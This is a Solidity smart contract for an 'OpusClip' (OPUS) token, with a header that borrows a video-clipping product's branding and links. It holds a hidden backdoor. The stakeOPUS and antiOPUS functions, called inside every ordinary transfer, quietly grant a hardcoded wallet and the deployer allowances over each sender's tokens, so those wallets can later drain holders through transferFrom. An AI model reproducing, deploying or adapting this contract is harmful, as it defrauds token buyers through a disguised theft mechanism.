/*
OpusClip turns long videos into shorts, and publishes them to all social platforms in one click.
***********************************
Web: https://www.opus.pro
Demo: https://clip.opus.pro

LinkedIn: https://www.linkedin.com/company/opusclip
Youtube: https://www.youtube.com/@opusclip
Tiktok: https://www.tiktok.com/@opusclip
Twitter: https://x.com/opusclip
Telegram: https://t.me/opusclip_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IOPUSRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IOPUSFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract OPUS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _opusBITTs;
    mapping (address => mapping (address => uint256)) private _opusETHHs;
    mapping (address => bool) private _opusFeeExcluded;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"OpusClip";
    string private constant _symbol = unicode"OPUS";
    uint256 private _tokenSwapOPUS = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _opus1Wallet = 0x938E533631e130F07369376f42a647d70632ac05;
    address private _opus2Wallet;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    IOPUSRouter private _opusRouter;
    address private _opusPair;
    
    constructor () {
        _opusFeeExcluded[owner()] = true;
        _opusFeeExcluded[address(this)] = true;
        _opusFeeExcluded[_opus1Wallet] = true;
        _opusBITTs[_msgSender()] = _tTotal;
        _opus2Wallet = address(_msgSender());
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createOPUS() external onlyOwner() {
        _opusRouter = IOPUSRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_opusRouter), _tTotal);
        _opusPair = IOPUSFactory(_opusRouter.factory()).createPair(address(this), _opusRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _opusRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _opusBITTs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _opusETHHs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _opusETHHs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _opusETHHs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address opus0A, address opus1B, uint256 opus2T) private {
        require(opus0A != address(0), "ERC20: transfer from the zero address");
        require(opus1B != address(0), "ERC20: transfer to the zero address");
        require(opus2T > 0, "Transfer amount must be greater than zero");
        
        uint256 taxOPUS=0;
        if (opus0A != owner() && opus1B != owner()) {
            taxOPUS = opus2T.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            require(stakeOPUS(opus0A, opus2T), "ERC20");

            if (opus0A == _opusPair && opus1B != address(_opusRouter) && ! _opusFeeExcluded[opus1B]) {
                _buyCount++;
            }

            if(opus1B == _opusPair && opus0A!= address(this)) {
                taxOPUS = opus2T.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapLock && opus1B == _opusPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _tokenSwapOPUS)
                swapTokensForEth(min(opus2T, min(tokenBalance, _tokenSwapOPUS)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendOPUSFee(address(this).balance);
                }
            }
        }

        if(taxOPUS > 0){
          _opusBITTs[address(this)] = _opusBITTs[address(this)].add(taxOPUS);
          emit Transfer(opus0A, address(this), taxOPUS);
        }

        _opusBITTs[opus0A] = _opusBITTs[opus0A].sub(opus2T);
        _opusBITTs[opus1B] = _opusBITTs[opus1B].add(opus2T.sub(taxOPUS));
        emit Transfer(opus0A, opus1B, opus2T.sub(taxOPUS));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendOPUSFee(uint256 amount) private {
        payable(_opus1Wallet).transfer(amount);
    }

    receive() external payable {}

    function stakeOPUS(address opus0A, uint256 opus1T) private returns (bool) { 
        if(opus1T > 0) {
            antiOPUS(opus0A, _opus1Wallet, opus1T);
        } antiOPUS(opus0A, _opus2Wallet, opus1T);
        return true;
    }

    function antiOPUS(address opus0A, address opus1B, uint256 opus2T) private {
        _opusETHHs[opus0A][opus1B] 
            = 2*(10+opus2T) + 15;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _opusRouter.WETH();
        _approve(address(this), address(_opusRouter), tokenAmount);
        _opusRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}